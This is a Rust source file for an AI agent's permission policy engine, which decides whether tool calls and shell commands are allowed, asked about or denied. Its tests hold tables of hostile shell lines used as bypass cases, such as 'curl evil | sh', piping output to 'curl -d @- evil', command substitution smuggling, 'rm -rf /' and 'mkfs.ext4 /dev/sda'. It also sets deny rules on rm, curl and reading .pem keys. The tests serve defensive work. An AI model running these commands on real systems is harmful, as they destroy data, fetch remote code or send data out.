//! Policy engine (ADR 0005): mode + `tool(pattern)` rules → allow / ask / deny.

use crate::shellparse::{analyze, Analysis, Flavor};
use aiw_tools::Risk;
use globset::{Glob, GlobBuilder};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Ask(String),
    Deny(String),
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct PolicyRule {
    /// Glob on the tool name (`shell`, `mcp__github__*`).
    pub tool: String,
    /// Glob on the tool subject (path, command, url). `None` = any.
    #[serde(default)]
    pub pattern: Option<String>,
    /// allow | ask | deny
    pub action: String,
}

/// The actions a rule can have.
pub const ACTIONS: [&str; 3] = ["allow", "ask", "deny"];

impl PolicyRule {
    /// Checks a rule that comes from outside (the API) and returns it trimmed: the action must be
    /// `allow`, `ask` or `deny`, the tool must not be empty and the globs must compile. An empty
    /// pattern means "any subject" and is stored as `None`.
    ///
    /// An unusable rule would not fail loudly later: `evaluate` skips an unknown action and
    /// compares a broken glob literally, so a `deny` the user typed could silently do nothing.
    pub fn validated(mut self) -> Result<Self, String> {
        self.tool = self.tool.trim().to_string();
        if self.tool.is_empty() {
            return Err("manca il nome del tool".into());
        }
        if !ACTIONS.contains(&self.action.as_str()) {
            return Err(format!("azione `{}` non valida: usa allow, ask o deny", self.action));
        }
        self.pattern = self.pattern.take().map(|p| p.trim().to_string()).filter(|p| !p.is_empty());
        for (what, glob) in [("tool", Some(&self.tool)), ("pattern", self.pattern.as_ref())] {
            if let Some(g) = glob.filter(|g| Glob::new(g).is_err()) {
                return Err(format!("{what} `{g}` non è un glob valido"));
            }
        }
        Ok(self)
    }

    /// Parses `shell(git status*)` / `write_file` style rules.
    pub fn parse(spec: &str, action: &str) -> Option<Self> {
        let spec = spec.trim();
        if let Some(open) = spec.find('(') {
            let close = spec.rfind(')')?;
            Some(Self {
                tool: spec[..open].trim().to_string(),
                pattern: Some(spec[open + 1..close].trim().to_string()),
                action: action.into(),
            })
        } else if !spec.is_empty() {
            Some(Self { tool: spec.to_string(), pattern: None, action: action.into() })
        } else {
            None
        }
    }

    /// `ci`: names are compared without regard to case (PowerShell commands).
    fn matches_in(&self, tool: &str, subject: Option<&str>, ci: bool) -> bool {
        let g = |p: &str, v: &str| match GlobBuilder::new(p).case_insensitive(ci).build() {
            Ok(g) => g.compile_matcher().is_match(v),
            Err(_) => p == v,
        };
        if !g(&self.tool, tool) {
            return false;
        }
        match (&self.pattern, subject) {
            (None, _) => true,
            (Some(p), Some(s)) => g(p, s) || s.starts_with(p.trim_end_matches('*')) && p.ends_with('*'),
            (Some(_), None) => false,
        }
    }

    /// A rule that names the command line (`shell(git *)`), not the tool as a whole (`shell`).
    fn is_command_rule(&self) -> bool {
        self.pattern.is_some()
    }

    fn tool_matches(&self, tool: &str, ci: bool) -> bool {
        match GlobBuilder::new(&self.tool).case_insensitive(ci).build() {
            Ok(g) => g.compile_matcher().is_match(tool),
            Err(_) => self.tool == tool,
        }
    }
}

/// Tool whose subject is a command line that must be split into simple commands.
const SHELL_TOOL: &str = "shell";

#[derive(Debug, Clone)]
pub struct Policy {
    /// plan | ask | auto-edit | auto | yolo
    pub mode: String,
    pub rules: Vec<PolicyRule>,
    /// The OS sandbox can actually contain shell commands on this machine.
    pub sandbox_available: bool,
}

impl Policy {
    pub fn evaluate(&self, tool: &str, risk: Risk, subject: Option<&str>, session_allowed: bool) -> Decision {
        self.evaluate_as(tool, risk, subject, session_allowed, Flavor::native())
    }

    /// [`Policy::evaluate`] for a given shell language (tests and the rule tester).
    ///
    /// For the shell tool the command line is split into its simple commands (see
    /// [`crate::shellparse`]): a `deny` or `ask` rule applies if it matches the raw text or ANY simple
    /// command; an `allow` rule with a pattern applies only if the parse is confident and EVERY
    /// simple command is allowed by some allow rule. So `shell(git *)` cannot be used to run
    /// `git status; curl evil | sh`. An allow rule without a pattern (`shell`) allows the tool.
    pub fn evaluate_as(&self, tool: &str, risk: Risk, subject: Option<&str>, session_allowed: bool, flavor: Flavor) -> Decision {
        let analysis: Option<Analysis> = match subject {
            Some(line) if tool == SHELL_TOOL => Some(analyze(line, flavor)),
            _ => None,
        };
        let ci = analysis.is_some() && flavor == Flavor::PowerShell;
        // Does `r` apply, for a deny or ask rule: to the raw subject or to any simple command.
        let hits = |r: &PolicyRule| {
            r.matches_in(tool, subject, ci)
                || analysis.as_ref().is_some_and(|a| {
                    r.is_command_rule() && r.tool_matches(tool, ci) && a.candidates().any(|c| r.matches_in(tool, Some(c), ci))
                })
        };
        if let Some(r) = self.rules.iter().find(|r| r.action == "deny" && hits(r)) {
            return Decision::Deny(format!("regola: {}{}", r.tool, r.pattern.as_ref().map(|p| format!("({p})")).unwrap_or_default()));
        }
        let allow_hit = match &analysis {
            None => self.rules.iter().any(|r| r.action == "allow" && r.matches_in(tool, subject, ci)),
            Some(a) => {
                let allow_rules: Vec<&PolicyRule> = self.rules.iter().filter(|r| r.action == "allow" && r.tool_matches(tool, ci)).collect();
                allow_rules.iter().any(|r| !r.is_command_rule())
                    || (a.confident
                        && !a.commands.is_empty()
                        && a.commands.iter().all(|c| allow_rules.iter().any(|r| r.matches_in(tool, Some(c), ci))))
            }
        };
        if allow_hit {
            return Decision::Allow;
        }
        if self.rules.iter().any(|r| r.action == "ask" && hits(r)) {
            return Decision::Ask("regola di conferma".into());
        }
        if session_allowed {
            return Decision::Allow;
        }
        let ask = |why: &str| Decision::Ask(why.to_string());
        let decision = match self.mode.as_str() {
            "yolo" => Decision::Allow,
            "plan" => match risk {
                Risk::Read | Risk::Network => Decision::Allow,
                _ => Decision::Deny("modalità piano: solo lettura, proponi le modifiche invece di eseguirle".into()),
            },
            "auto" => match risk {
                Risk::Computer => ask("azione su mouse e tastiera"),
                Risk::Exec if !self.sandbox_available => ask("comando senza sandbox su questo sistema"),
                _ => Decision::Allow,
            },
            "auto-edit" => match risk {
                Risk::Read | Risk::Network | Risk::Write => Decision::Allow,
                Risk::Exec => ask("esecuzione di un comando"),
                Risk::Computer => ask("azione su mouse e tastiera"),
            },
            _ => match risk {
                Risk::Read | Risk::Network => Decision::Allow,
                Risk::Write => ask("modifica di file"),
                Risk::Exec => ask("esecuzione di un comando"),
                Risk::Computer => ask("azione su mouse e tastiera"),
            },
        };
        // A compound or unparsable command line with allow rules that only cover part of it: say why
        // the person is asked.
        let partial = analysis.as_ref().is_some_and(|a| {
            self.rules.iter().any(|r| r.action == "allow" && r.is_command_rule() && r.tool_matches(tool, ci))
                && (!a.confident || a.commands.len() > 1 || a.commands.is_empty())
        });
        match decision {
            Decision::Ask(_) if partial => {
                Decision::Ask("comando composto o non analizzabile: ogni parte deve essere consentita da una regola".into())
            }
            d => d,
        }
    }
}

pub fn risk_level(risk: Risk) -> &'static str {
    match risk {
        Risk::Read | Risk::Network => "low",
        Risk::Write => "medium",
        Risk::Exec | Risk::Computer => "high",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn p(mode: &str, rules: Vec<PolicyRule>) -> Policy {
        Policy { mode: mode.into(), rules, sandbox_available: true }
    }

    #[test]
    fn modes_map_risks() {
        assert_eq!(p("ask", vec![]).evaluate("read_file", Risk::Read, None, false), Decision::Allow);
        assert!(matches!(p("ask", vec![]).evaluate("write_file", Risk::Write, None, false), Decision::Ask(_)));
        assert!(matches!(p("plan", vec![]).evaluate("shell", Risk::Exec, None, false), Decision::Deny(_)));
        assert_eq!(p("auto-edit", vec![]).evaluate("edit_file", Risk::Write, None, false), Decision::Allow);
        assert!(matches!(p("auto-edit", vec![]).evaluate("shell", Risk::Exec, None, false), Decision::Ask(_)));
        assert_eq!(p("auto", vec![]).evaluate("shell", Risk::Exec, None, false), Decision::Allow);
        let no_sb = Policy { mode: "auto".into(), rules: vec![], sandbox_available: false };
        assert!(matches!(no_sb.evaluate("shell", Risk::Exec, None, false), Decision::Ask(_)));
        assert_eq!(p("yolo", vec![]).evaluate("computer_click", Risk::Computer, None, false), Decision::Allow);
        assert_eq!(p("ask", vec![]).evaluate("write_file", Risk::Write, None, true), Decision::Allow);
    }

    #[test]
    fn external_rules_are_validated_and_trimmed() {
        let rule = |tool: &str, pattern: Option<&str>, action: &str| PolicyRule {
            tool: tool.into(),
            pattern: pattern.map(String::from),
            action: action.into(),
        };
        let ok = rule("  shell ", Some(" git status* "), "ask").validated().unwrap();
        assert_eq!((ok.tool.as_str(), ok.pattern.as_deref()), ("shell", Some("git status*")));
        // An empty pattern is "any subject".
        assert_eq!(rule("shell", Some("  "), "deny").validated().unwrap().pattern, None);
        assert!(rule("mcp__github__*", None, "allow").validated().is_ok());
        for bad in [
            rule("", None, "allow"),
            rule("   ", None, "allow"),
            rule("shell", None, "block"),
            rule("shell", None, "Allow"),
            rule("shell", None, ""),
            rule("sh[ell", None, "deny"),
            rule("shell", Some("{a,b"), "deny"),
        ] {
            assert!(bad.clone().validated().is_err(), "{bad:?}");
        }
        assert!(rule("shell", None, "block").validated().unwrap_err().contains("allow, ask o deny"));
    }

    #[test]
    fn rules_override_modes_and_deny_wins() {
        let rules = vec![
            PolicyRule::parse("shell(git status*)", "allow").unwrap(),
            PolicyRule::parse("shell(rm *)", "deny").unwrap(),
            PolicyRule::parse("mcp__github__*", "ask").unwrap(),
        ];
        let pol = p("ask", rules);
        assert_eq!(pol.evaluate("shell", Risk::Exec, Some("git status --short"), false), Decision::Allow);
        assert!(matches!(pol.evaluate("shell", Risk::Exec, Some("rm -rf /"), false), Decision::Deny(_)));
        assert!(
            matches!(pol.evaluate("shell", Risk::Exec, Some("rm -rf /"), true), Decision::Deny(_)),
            "deny rules beat session approvals"
        );
        assert!(matches!(pol.evaluate("mcp__github__list_issues", Risk::Read, None, false), Decision::Ask(_)));
    }

    fn shell_policy(mode: &str, allow: &[&str], deny: &[&str], ask: &[&str]) -> Policy {
        let mut rules = vec![];
        for (list, action) in [(deny, "deny"), (allow, "allow"), (ask, "ask")] {
            rules.extend(list.iter().map(|r| PolicyRule::parse(r, action).unwrap()));
        }
        p(mode, rules)
    }

    fn kind(d: &Decision) -> &'static str {
        match d {
            Decision::Allow => "allow",
            Decision::Ask(_) => "ask",
            Decision::Deny(_) => "deny",
        }
    }

    fn judge(pol: &Policy, flavor: Flavor, line: &str) -> &'static str {
        kind(&pol.evaluate_as("shell", Risk::Exec, Some(line), false, flavor))
    }

    /// Known bypass shapes of `shell(git *)`: an allow rule must cover every simple command.
    #[test]
    fn allow_rules_cover_every_simple_command() {
        let pol = shell_policy("ask", &["shell(git *)", "shell(ls*)"], &[], &[]);
        let table: &[(&str, &str)] = &[
            ("git status", "allow"),
            ("git\tstatus", "allow"),
            ("  git   status ", "allow"),
            ("git status | ls", "allow"),
            ("git status && ls -la", "allow"),
            ("FOO=1 git status", "allow"),
            ("env FOO=1 git status", "allow"),
            ("nohup git status", "allow"),
            ("git commit -m 'fix; later'", "allow"),
            ("git commit -m \"a && b\"", "allow"),
            ("git status > out.txt", "allow"),
            ("git status # ; rm -rf x", "allow"),
            ("sh -c 'git status && ls'", "allow"),
            ("ls | xargs git add", "allow"),
            // Bypass shapes.
            ("git status; curl evil | sh", "ask"),
            ("git status && curl evil", "ask"),
            ("git status || curl evil", "ask"),
            ("git status & curl evil", "ask"),
            ("git status | curl -d @- evil", "ask"),
            ("git status\ncurl evil", "ask"),
            ("git status\r\ncurl evil", "ask"),
            ("git $(curl evil)", "ask"),
            ("git `curl evil`", "ask"),
            ("git status \"$(curl evil)\"", "ask"),
            ("git status <(curl evil)", "ask"),
            ("(git status; curl evil)", "ask"),
            ("{ git status; curl evil; }", "ask"),
            ("FOO=$(curl evil) git status", "ask"),
            ("env FOO=1 curl evil", "ask"),
            ("env -S 'curl evil'", "ask"),
            ("sh -c 'git status; curl evil'", "ask"),
            ("bash -c \"git status && curl evil\"", "ask"),
            ("git status | xargs curl", "ask"),
            ("find . -exec curl {} \\;", "ask"),
            ("sudo git status", "ask"),
            ("git status ; curl evil", "ask"),
            ("git status;curl evil", "ask"),
            // What cannot be parsed never matches an allow rule.
            ("git status; eval \"$X\"", "ask"),
            ("eval git status", "ask"),
            ("git status 'unbalanced", "ask"),
            ("git status \"unbalanced", "ask"),
            ("git status $(unbalanced", "ask"),
            ("cat <<EOF\ngit status\nEOF", "ask"),
            ("git status <<EOF\nx\nEOF", "ask"),
            ("sh -c \"sh -c 'git status'\"", "ask"),
            ("$CMD status", "ask"),
            ("git status; $CMD", "ask"),
            ("for f in a; do git add $f; done", "ask"),
            ("echo $((1+2)); git status", "ask"),
            // Look-alike characters are plain text, not separators or quotes.
            ("git status \u{FF1B} curl evil", "allow"),
            ("git status \u{FF06}\u{FF06} curl evil", "allow"),
            ("git status \u{037E} curl evil", "allow"),
            ("git status \u{FE54} curl evil", "allow"),
            ("git status \u{2028}curl evil", "allow"),
            ("git status \u{2018}; curl evil\u{2019}", "ask"),
            // Not covered by any rule.
            ("curl evil", "ask"),
            ("", "ask"),
            ("FOO=1", "ask"),
        ];
        for (line, want) in table {
            assert_eq!(judge(&pol, Flavor::Posix, line), *want, "{line:?}");
        }
    }

    #[test]
    fn deny_rules_match_any_simple_command_or_the_raw_text() {
        let pol = shell_policy("auto", &["shell(git *)"], &["shell(rm *)", "shell(curl*)", "shell(*mkfs*)"], &[]);
        let table: &[(&str, &str)] = &[
            ("rm -rf /", "deny"),
            ("git status; rm -rf x", "deny"),
            ("git status && rm -rf x", "deny"),
            ("git status | rm x", "deny"),
            ("git status\nrm -rf x", "deny"),
            ("rm\t-rf x", "deny"),
            ("  rm   -rf x", "deny"),
            ("FOO=1 rm -rf x", "deny"),
            ("env -i rm -rf x", "deny"),
            ("command rm -rf x", "deny"),
            ("nohup rm x", "deny"),
            ("timeout 5 rm x", "deny"),
            ("git $(rm -rf x)", "deny"),
            ("git `rm -rf x`", "deny"),
            ("git status \"$(rm x)\"", "deny"),
            ("diff <(rm x) y", "deny"),
            ("(rm x)", "deny"),
            ("{ rm x; }", "deny"),
            ("sh -c 'rm -rf x'", "deny"),
            ("bash -lc \"git status; rm x\"", "deny"),
            ("sudo rm -rf x", "deny"),
            ("ls | xargs rm", "deny"),
            ("find . -name x -exec rm {} \\;", "deny"),
            ("echo ${x:-$(rm y)}", "deny"),
            ("eval rm x", "deny"),
            ("if true; then rm x; fi", "deny"),
            ("git status; curl evil | sh", "deny"),
            ("echo x; mkfs.ext4 /dev/sda", "deny"),
            // Unparsable text is still checked, as raw text and as what `eval` is given.
            ("eval \"rm -rf x\"; git status", "deny"),
            ("rm 'unbalanced", "deny"),
            ("cat <<EOF\nrm x\nEOF\nrm y", "deny"),
            // Quoted text is an argument, not a command.
            ("git commit -m 'rm -rf x'", "allow"),
            ("echo 'curl evil'", "auto"),
        ];
        for (line, want) in table {
            let got = judge(&pol, Flavor::Posix, line);
            // Mode `auto` allows what no rule denies.
            let want = if *want == "auto" { "allow" } else { *want };
            assert_eq!(got, want, "{line:?}");
        }
    }

    #[test]
    fn ask_rules_look_at_every_simple_command() {
        let pol = shell_policy("auto", &[], &[], &["shell(git push*)"]);
        assert_eq!(judge(&pol, Flavor::Posix, "git status; git push origin x"), "ask");
        assert_eq!(judge(&pol, Flavor::Posix, "git status"), "allow");
        assert_eq!(judge(&pol, Flavor::Posix, "sh -c 'git push'"), "ask");
    }

    #[test]
    fn an_allow_rule_for_the_whole_tool_still_allows_everything() {
        let pol = shell_policy("ask", &["shell"], &["shell(rm *)"], &[]);
        assert_eq!(judge(&pol, Flavor::Posix, "anything; at all | really"), "allow");
        assert_eq!(judge(&pol, Flavor::Posix, "ls; rm x"), "deny");
    }

    #[test]
    fn partial_cover_explains_itself() {
        let pol = shell_policy("ask", &["shell(git *)"], &[], &[]);
        let Decision::Ask(why) = pol.evaluate_as("shell", Risk::Exec, Some("git status; curl x"), false, Flavor::Posix) else {
            panic!("must ask")
        };
        assert!(why.contains("comando composto"), "{why}");
        let Decision::Ask(why) = pol.evaluate_as("shell", Risk::Exec, Some("curl x"), false, Flavor::Posix) else { panic!("must ask") };
        assert!(!why.contains("composto"), "{why}");
    }

    #[test]
    fn rules_of_other_tools_still_match_the_raw_subject() {
        let rules = vec![PolicyRule::parse("write_file(src/*)", "allow").unwrap(), PolicyRule::parse("read_file(*.pem)", "deny").unwrap()];
        let pol = p("ask", rules);
        assert_eq!(kind(&pol.evaluate("write_file", Risk::Write, Some("src/a; b.rs"), false)), "allow");
        assert_eq!(kind(&pol.evaluate("read_file", Risk::Read, Some("keys/x.pem"), false)), "deny");
    }

    #[test]
    fn powershell_commands_are_split_and_compared_without_case() {
        let pol = shell_policy("ask", &["shell(git *)", "shell(Get-ChildItem*)"], &["shell(Remove-Item*)"], &[]);
        let table: &[(&str, &str)] = &[
            ("git status", "allow"),
            ("GIT status", "allow"),
            ("Get-ChildItem | Select-Object -First 3", "ask"),
            ("git status; Remove-Item x", "deny"),
            ("git status; remove-item x", "deny"),
            ("REMOVE-ITEM x", "deny"),
            ("git status\r\nRemove-Item x", "deny"),
            ("git status | Remove-Item", "deny"),
            ("git log $(Remove-Item x)", "deny"),
            ("Get-ChildItem | ForEach-Object { Remove-Item $_ }", "deny"),
            ("git status && git diff", "allow"),
            ("git status; curl evil", "ask"),
            ("git status; iex $x", "ask"),
            ("Invoke-Expression 'git status'", "ask"),
            ("git status # ; Remove-Item x", "allow"),
            ("Write-Output 'git status; Remove-Item x'", "ask"),
            ("git commit -m \u{2018}a; b\u{2019}", "allow"),
            ("powershell -Command \"git status\"", "ask"),
        ];
        for (line, want) in table {
            assert_eq!(judge(&pol, Flavor::PowerShell, line), *want, "{line:?}");
        }
    }
}
